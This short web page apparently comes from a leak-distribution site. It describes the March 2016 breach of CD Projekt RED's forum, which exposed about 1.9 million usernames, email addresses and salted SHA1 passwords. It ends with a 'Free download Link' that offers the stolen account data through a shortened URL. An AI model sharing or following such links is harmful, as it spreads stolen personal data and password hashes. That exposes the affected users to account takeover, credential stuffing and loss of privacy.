# CDProjektRed database leak

## Description

2016-03-01

In March 2016, <a href="http://forums.cdprojektred.com/forum/en/the-witcher-series/news-aa/7248610-important-potential-unauthorized-access-to-the-forums%E2%80%99-data" target="_blank" rel="noopener">Polish game developer CD Projekt RED suffered a data breach</a>. The hack of their forum led to the exposure of almost 1.9 million accounts along with usernames, email addresses and salted SHA1 passwords.

## Breached data

Email addresses, Passwords, Usernames

## Free download Link

[CDProjektRed breach Free Download Link](https://tinyurl.com/2b2k277t)